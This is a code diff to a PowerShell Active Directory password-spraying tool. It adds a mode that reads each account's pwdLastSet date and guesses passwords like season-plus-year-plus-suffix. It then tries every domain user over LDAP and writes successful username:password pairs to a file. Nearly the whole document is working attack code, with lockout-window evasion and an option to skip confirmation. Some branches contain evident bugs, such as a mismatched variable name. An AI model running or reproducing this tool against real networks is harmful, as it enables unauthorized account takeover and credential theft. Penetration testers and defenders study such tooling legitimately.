@@ -37,6 +37,30 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER Force
     
     Forces the spray to continue and doesn't prompt for confirmation.
+    
+    .PARAMETER PwdLastSet
+    
+    Use the Active Directory pwdLastSet attribute for the user to formulate a season or month and year based guess.
+    
+    .PARAMETER MonthYear
+    
+    When pwdLastSet is used, this identifies that the guess should be month/year instead of the default season/year format.
+    
+    .PARAMETER MonthFormat
+    
+    Valid values are Short/Long. Results in a password guess based on the pwdLastSet date with the month of the password change as the base word.
+        
+    .PARAMETER YearFormat
+    
+    Valid values are Short/Long. Results in year value represented in 2-digit and 4-digit format.
+    
+    .PARAMETER LowerCase
+    
+    When pwdLastSet is used, this forces the password to be formulated as lower case versus initial caps.
+    
+    .PARAMETER AppendChars
+    
+    When pwdLastSet is used, this identifies characters that should be appended to the guess.
 
     .EXAMPLE
 
@@ -53,6 +77,12 @@ function Invoke-DomainPasswordSpray{
     Description
     -----------
     This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
+    
+    C:\PS> Invoke-DomainPasswordSpray -PwdLastSet -YearFormat Long -AppendChars "!" -Domain domain-name -OutFile sprayed-creds.txt
+        
+    Description
+    -----------
+    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password consisting of the season that the password was last changed (according to pwdLastSet) with the four digit year and the ! character appended.   
 
 
     #>
@@ -80,7 +110,36 @@ function Invoke-DomainPasswordSpray{
 
      [Parameter(Position = 5, Mandatory = $false)]
      [switch]     
-     $Force
+     $Force,
+     
+     # Added parameters to support use of pwdLastSet date information
+     
+     [Parameter(Position = 6, Mandatory = $false)]
+     [switch]
+     $PwdLastSet,
+          
+     [Parameter(Position = 7, Mandatory = $false)]
+     [switch]
+     $MonthYear,
+     
+     [Parameter(Position = 8, Mandatory = $false)]
+     [ValidateSet('Short','Long')]
+     [string]
+     $MonthFormat = "Long",
+     
+     [Parameter(Position = 9, Mandatory = $false)]
+     [ValidateSet('Short','Long')]
+     [string]
+     $YearFormat = "Long",
+
+     [Parameter(Position = 11, Mandatory = $false)]
+     [switch]
+     $LowerCase,
+     
+     [Parameter(Position = 10, Mandatory = $false)]
+     [string]
+     $AppendChars = ""
+     
     )
     
     if ($Domain -ne "")
@@ -115,23 +174,39 @@ function Invoke-DomainPasswordSpray{
 
     if ($UserList -eq "")
     {
-    $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
+        if ($PwdLastSet)
+        {
+            $UserListArray = Get-DomainUserList -PwdLastSet -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
+        }
+        else
+        {
+            $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts        
+        }
     }
     else
     {
-        #if a Userlist is specified use it and do not check for lockout thresholds
-        Write-Host "[*] Using $UserList as userlist to spray with"
-        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
-        $UserListArray = @()
-        try 
+        if ($PwdLastSet)
+        {           
+            Write-Host "[*] Using $UserList as userlist to spray with"
+            Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
+        }
+        else
         {
-            $UserListArray = Get-Content $UserList -ErrorAction stop
-        }
-        catch [Exception]{
-            Write-Host -ForegroundColor "red" "$_.Exception"
-            break
-        }
-    
+            #if a Userlist is specified use it and do not check for lockout thresholds
+            Write-Host "[*] Using $UserList as userlist to spray with"
+            Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
+            $UserListArray = @{}
+            try 
+            {
+                $UserListArray = Get-Content $UserList -ErrorAction stop
+            }
+            catch [Exception]
+            {
+                Write-Host -ForegroundColor "red" "$_.Exception"
+                break
+            }
+        
+        }    
     }
 
     # If a single password is selected do this
@@ -140,20 +215,20 @@ function Invoke-DomainPasswordSpray{
         #if no force flag is set we will ask if the user is sure they want to spray
         if (!$Force)
         {
-        $title = "Confirm Password Spray"
-        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+            $title = "Confirm Password Spray"
+            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
 
-        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list."
+            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+                "Attempts to authenticate 1 time per user in the list."
 
-        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-            "Cancels the password spray."
+            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+                "Cancels the password spray."
 
-        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
 
-        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
 
-        switch ($result)
+            switch ($result)
             {
                 0 
                 {
@@ -163,8 +238,152 @@ function Invoke-DomainPasswordSpray{
                     $curr_user = 0
                     $count = $UserListArray.count
 
-                    ForEach($User in $UserListArray){
+                    foreach ($User in $UserListArray){
                     $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+                        if ($Domain_check.name -ne $null)
+                        {
+                            if ($OutFile -ne "")
+                            {    
+                                Add-Content $OutFile $User`:$Password
+                            }
+                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+                        }
+                        $curr_user+=1 
+                        Write-Host -nonewline "$curr_user of $count users tested`r"
+                        }
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+                    if ($OutFile -ne "")
+                    {
+                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+                    }                
+                }
+                1 
+                {
+                    "Cancelling the password spray."
+                }
+            }
+        }
+        #If the force flag is set don't bother asking if we are sure we want to spray.
+        if ($Force)
+        {
+            $time = Get-Date
+            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
+            Write-Host "[*] This might take a while depending on the total number of users"
+            $curr_user = 0
+            $count = $UserListArray.count
+
+            foreach ($User in $UserListArray){
+                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+                if ($Domain_check.name -ne $null)
+                {
+                    if ($OutFile -ne "")
+                    {    
+                        Add-Content $OutFile $User`:$Password
+                    }
+                    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+                }
+                $curr_user+=1 
+                Write-Host -nonewline "$curr_user of $count users tested`r"
+            }
+            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+        
+            if ($OutFile -ne "")
+            {
+                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+            }
+        }        
+    }
+    # If pwdLastSet Style attack is selected, do this
+    elseif ($PwdLastSet)
+    {
+        #if no force flag is set we will ask if the user is sure they want to spray
+        if (!$Force)
+        {
+            $title = "Confirm Password Spray"
+            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+
+            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+                "Attempts to authenticate 1 time per user in the list."
+
+            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+                "Cancels the password spray."
+
+            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+
+            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+
+            switch ($result)
+            {
+                0 
+                {
+                    $time = Get-Date
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
+                    Write-Host "[*] This might take a while depending on the total number of users"
+                    $curr_user = 0
+                    $count = $UserListArray.count
+
+                    foreach($kvp in $UserListArray.GetEnumerator())
+                    {
+                        $User = $kvp.Key
+                        $pwdLastSetDate = $kvp.Value
+                        
+                        $password = ""
+                        
+                        # Check Month/Year variable to see if user wants to try the month of the last password change
+                        if ($MonthYear)             
+                        {
+                            if ($MonthFormat -eq "Long")
+                            {
+                                $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month)
+                            }
+                            else
+                            {
+                                $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month).Substring(0,3)                            
+                            }
+                        }
+                        # If Month/Year is not specified, then use Season/Year
+                        else
+                        {
+                            # Calculate the password base word from the season that it was last changed
+                            if (($pwdLastSetDate.Month -eq 12) -or ($pwdLastSetDate.Month -eq 1) -or ($pwdLastSetDate.Month -eq 2))
+                            {
+                                $base = "Winter"
+                            }
+                            elseif (($pwdLastSetDate.Month -eq 3) -or ($pwdLastSetDate.Month -eq 4) -or ($pwdLastSetDate.Month -eq 5))
+                            {
+                                $base = "Spring"
+                            }
+                            elseif (($pwdLastSetDate.Month -eq 6) -or ($pwdLastSetDate.Month -eq 7) -or ($pwdLastSetDate.Month -eq 8))
+                            {
+                                $base = "Summer"
+                            }
+                            else
+                            {
+                                $base = "Fall"
+                            }
+                        }
+                            
+                        # Put the year that the password was changed into the appropriate format (2-digit or 4-digit)
+                        if ($YearFormat -eq "Long")
+                        {
+                            $year = $pwdLastSetDate.Year.ToString()
+                        }
+                        else
+                        {
+                            $year = $pwdLastSetDate.Year.ToString().SubString(2)
+                        }
+                          
+                        # Send InitCaps password or LowerCase password based on InitCaps switch
+                        if (!$LowerCase)
+                        {
+                            $password = $base + $year + $AppendChars
+                        }
+                        else
+                        {
+                            $password = $base.ToLower() + $year + $AppendChars
+                        }                           
+                        
+                        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                         If ($Domain_check.name -ne $null)
                         {
                             if ($OutFile -ne "")
@@ -189,37 +408,97 @@ function Invoke-DomainPasswordSpray{
         #If the force flag is set don't bother asking if we are sure we want to spray.
         if ($Force)
         {
-        $time = Get-Date
-        Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
-        Write-Host "[*] This might take a while depending on the total number of users"
-        $curr_user = 0
-        $count = $UserListArray.count
+            $time = Get-Date
+            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
+            Write-Host "[*] This might take a while depending on the total number of users"
+            $curr_user = 0
+            $count = $UserListArray.count
 
-        ForEach($User in $UserListArray){
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-            If ($Domain_check.name -ne $null)
+            foreach($kvp in $UserListArray.GetEnumerator())
             {
-                if ($OutFile -ne "")
-                {    
-                    Add-Content $OutFile $User`:$Password
+                $User = $kvp.Key
+                $pwdLastSetDate = $kvp.Value
+                   
+                $password = ""
+                        
+                # Check Month/Year variable to see if user wants to try the month of the last password change
+                if ($MonthYear)             
+                {
+                    if ($MonthFormat -eq "Long")
+                    {
+                        $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month)
+                    }
+                    else
+                    {
+                        $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month).Substring(0,3)                            
+                    }
                 }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+                # If Month/Year is not specified, then use Season/Year
+                else
+                {
+                    # Calculate the password base word from the season that it was last changed
+                    if (($pwdLastSetDate.Month -eq 12) -or ($pwdLastSetDate.Month -eq 1) -or ($pwdLastSetDate.Month -eq 2))
+                    {
+                        $base = "Winter"
+                    }
+                    elseif (($pwdLastSetDate.Month -eq 3) -or ($pwdLastSetDate.Month -eq 4) -or ($pwdLastSetDate.Month -eq 5))
+                    {
+                        $base = "Spring"
+                    }
+                    elseif (($pwdLastSetDate.Month -eq 6) -or ($pwdLastSetDate.Month -eq 7) -or ($pwdLastSetDate.Month -eq 8))
+                    {
+                       $base = "Summer"
+                    }
+                    else
+                    {
+                        $base = "Fall"
+                    }
+                }
+                            
+                # Put the year that the password was changed into the appropriate format (2-digit or 4-digit)
+                if ($YearFormat -eq "Long")
+                {
+                    $year = $pwdLastSetDate.Year.ToString()
+                }
+                else
+                {
+                    $year = $pwdLastSetDate.Year.ToString().SubString(2)
+                }
+                          
+                # Send LowerCase password based on presence of LowerCase switch
+                if (!$LowerCase)
+                {
+                    $password = $base + $year + $AppendChars
+                }
+                else
+                {
+                    $password = $base.ToLower() + $year + $AppendChars
+                }                           
+                
+                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+                
+                if ($Domain_check.name -ne $null)
+                {
+                    if ($OutFile -ne "")
+                    {    
+                        Add-Content $OutFile $User`:$Password
+                    }
+                    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+                }
+                $curr_user+=1 
+                Write-Host -nonewline "$curr_user of $count users tested`r"
             }
-            $curr_user+=1 
-            Write-Host -nonewline "$curr_user of $count users tested`r"
+            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+            
+            if ($OutFile -ne "")
+            {
+                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
             }
-        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-        if ($OutFile -ne "")
-        {
-        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-        }
-        }
-
-
-        
-    }
-        # If a password list is selected do this
-    ElseIf($PasswordList){
+        }       
+    }   
+    # If a password list is selected do this
+    elseif($PasswordList)
+    {
         $Passwords = Get-Content $PasswordList
         #Get account lockout observation window to avoid running more than 1 password spray per observation window.
         $net_accounts = "cmd.exe /C net accounts /domain"
@@ -236,95 +515,105 @@ function Invoke-DomainPasswordSpray{
         #if no force flag is set we will ask if the user is sure they want to spray
         if (!$Force)
         {
-        $title = "Confirm Password Spray"
-        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+            $title = "Confirm Password Spray"
+            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
 
-        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
+            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+                "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
 
-        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-            "Cancels the password spray."
+            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+                "Cancels the password spray."
 
-        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
 
-        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
 
-        switch ($result)
+            switch ($result)
             {
                 0 
                 {
-                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-                Write-Host "[*] This might take a while depending on the total number of users"
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+                    Write-Host "[*] This might take a while depending on the total number of users"
 
-                ForEach($Password_Item in $Passwords){
-                $time = Get-Date
-                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
-                $curr_user = 0
-                $count = $UserListArray.count
+                    foreach ($Password_Item in $Passwords)
+                    {
+                        $time = Get-Date
+                        Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
+                        $curr_user = 0
+                        $count = $UserListArray.count
 
-                ForEach($User in $UserListArray){
-                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
-                If ($Domain_check.name -ne $null)
-                {
+                        foreach ($User in $UserListArray)
+                        {
+                            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
+                            if ($Domain_check.name -ne $null)
+                            {
+                                if ($OutFile -ne "")
+                                {
+                                    Add-Content $OutFile $User`:$Password_Item
+                                }
+                                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
+                            }
+                            $curr_user+=1 
+                            Write-Host -nonewline "$curr_user of $count users tested`r"
+                        }
+                        Countdown-Timer -Seconds (60*$observation_window)
+                    }
+            
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+            
                     if ($OutFile -ne "")
                     {
-                    Add-Content $OutFile $User`:$Password_Item
+                        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                     }
-                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
-                }
-                $curr_user+=1 
-                Write-Host -nonewline "$curr_user of $count users tested`r"
-                }
-                Countdown-Timer -Seconds (60*$observation_window)
-            }
-            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-            if ($OutFile -ne "")
-            {
-            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-            }
                 
                 }
-                1 {"Cancelling the password spray."}
+                1 
+                {
+                    "Cancelling the password spray."
+                }
             }
         }
         #if the force flag is set we will not bother asking about proceeding with password spray.
         if($Force)
         {
-                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-                Write-Host "[*] This might take a while depending on the total number of users"
+            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+            Write-Host "[*] This might take a while depending on the total number of users"
 
-                ForEach($Password_Item in $Passwords){
+            foreach($Password_Item in $Passwords)
+            {
                 $time = Get-Date
                 Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                 $curr_user = 0
                 $count = $UserListArray.count
 
-                ForEach($User in $UserListArray){
-                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
-                If ($Domain_check.name -ne $null)
+                foreach($User in $UserListArray)
                 {
-                    if ($OutFile -ne "")
+                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
+                    if ($Domain_check.name -ne $null)
                     {
-                    Add-Content $OutFile $User`:$Password_Item
+                        if ($OutFile -ne "")
+                        {
+                            Add-Content $OutFile $User`:$Password_Item
+                        }
+                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
                     }
-                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
-                }
-                $curr_user+=1 
-                Write-Host -nonewline "$curr_user of $count users tested`r"
+                    $curr_user+=1 
+                    Write-Host -nonewline "$curr_user of $count users tested`r"
                 }
                 Countdown-Timer -Seconds (60*$observation_window)
             }
             Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+            
             if ($OutFile -ne "")
             {
-            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-            }
-                
+                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+            }                
         }
     }
-    Else{
-    Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
-    break
+    Else
+    {
+        Write-Host -ForegroundColor Red "The -Password, -PasswordList, or -PwdLastSet option must be specified"
+        break
     }
 }
 
@@ -334,14 +623,16 @@ Function Countdown-Timer
         $Seconds = 1800,
         $Message = "[*] Pausing to avoid account lockout."
     )
-    ForEach ($Count in (1..$Seconds))
-    {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
+    foreach ($Count in (1..$Seconds))
+    {   
+        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
         Start-Sleep -Seconds 1
     }
     Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
-Function Get-DomainUserList{
+Function Get-DomainUserList
+{
 
 <#
     .SYNOPSIS
@@ -368,7 +659,11 @@ Function Get-DomainUserList{
     
     .PARAMETER RemovePotentialLockouts
     
-    Removes accounts within 1 attempt of locking out. 
+    Removes accounts within 1 attempt of locking out.
+    
+    .PARAMETER PwdLastSet
+    
+    Returns the PwdLastSet date along with the samAccountName in a HashTable instead of an array. 
     
     .EXAMPLE
 
@@ -398,7 +693,11 @@ Function Get-DomainUserList{
      
      [Parameter(Position = 2, Mandatory = $false)]
      [switch]
-     $RemovePotentialLockouts
+     $RemovePotentialLockouts,
+     
+     [Parameter(Position = 3, Mandatory = $false)]
+     [switch]
+     $PwdLastSet
     )
     
    if ($Domain -ne "")
@@ -496,6 +795,10 @@ Function Get-DomainUserList{
         $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
         $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
         $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
+        if ($pwdLastSet)
+        {
+            $UserSearcher.PropertiesToLoad.Add("pwdlastset") > $Null
+        }
         
         If ($RemoveDisabled){
                 Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
@@ -511,50 +814,104 @@ Function Get-DomainUserList{
         $UserSearcher.PageSize = 1000
         $AllUserObjects = $UserSearcher.FindAll()
         Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
-        $UserListArray = @()
         
-        If ($RemovePotentialLockouts)
+        if ($PwdLastSet)
         {
-        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
-        Foreach ($user in $AllUserObjects)
+            # converted $UserListArray to a hashtable to accomodate collection of pwdLastSet dates
+            $UserListArray = @{} 
+        
+            If ($RemovePotentialLockouts)
             {
-                #Getting bad password counts and lst bad password time for each user
-                $badcount = $user.Properties.badpwdcount
-                $samaccountname = $user.Properties.samaccountname
-                try
+                Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
+                Foreach ($user in $AllUserObjects)
                 {
-                    $badpasswordtime = $user.Properties.badpasswordtime[0]
-                }
-                catch
-                {
-                    continue
-                }
-                $currenttime = Get-Date
-                $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
-                $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
-
-                if ($badcount)
-                {
-                    
-                    [int]$userbadcount = [convert]::ToInt32($badcount, 10)
-                    $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
-                    #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
-                    if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                    #Getting bad password counts and lst bad password time for each user
+                    $badcount = $user.Properties.badpwdcount
+                    $samaccountname = $user.Properties.samaccountname
+                    $pwdlastsetdate = $user.Properties.pwdlastset[0]
+                    try
                     {
-                        $UserListArray += $samaccountname
+                        $badpasswordtime = $user.Properties.badpasswordtime[0]
                     }
+                    catch
+                    {
+                        continue
+                    }
+                    $currenttime = Get-Date
+                    $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
+                    $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
+
+                    if ($badcount)
+                    {
+                    
+                        [int]$userbadcount = [convert]::ToInt32($badcount, 10)
+                        $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
+                        #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
+                        if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                        {
+                            $UserListArray.add($samaccountname,[DateTime]::FromFileTime($pwdlastsetdate))
+                        }
+                    }
+                }
+            }
+            else
+            {
+                foreach ($user in $AllUserObjects)
+                {
+                    $samaccountname = $user.Properties.samaccountname
+                    $pwdlastset = $user.Properties.pwdlastset
+                    $UserListArray.add($samaccountname,[DateTime]::FromFileTime($pwdlastsetdate))
                 }
             }
         }
         else
         {
-        Foreach ($user in $AllUserObjects)
+            # converted $UserListArray to a hashtable to accomodate collection of pwdLastSet dates
+            $UserListArray = @() 
+        
+            If ($RemovePotentialLockouts)
             {
-            $samaccountname = $user.Properties.samaccountname
-            $UserListArray += $samaccountname
+                Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
+                Foreach ($user in $AllUserObjects)
+                {
+                    #Getting bad password counts and lst bad password time for each user
+                    $badcount = $user.Properties.badpwdcount
+                    $samaccountname = $user.Properties.samaccountname
+                    try
+                    {
+                        $badpasswordtime = $user.Properties.badpasswordtime[0]
+                    }
+                    catch
+                    {
+                        continue
+                    }
+                    $currenttime = Get-Date
+                    $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
+                    $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
+
+                    if ($badcount)
+                    {
+                    
+                        [int]$userbadcount = [convert]::ToInt32($badcount, 10)
+                        $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
+                        #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
+                        if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                        {
+                            $UserListArray += $samaccountname
+                        }
+                    }
+                }
             }
+            else
+            {
+                foreach ($user in $AllUserObjects)
+                {
+                    $samaccountname = $user.Properties.samaccountname
+                    $UserListArray += $samaccountname
+                }
+            }       
         }
         
-            Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
-            return $UserListArray
-}
+        Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
+        return $UserListArray
+    }
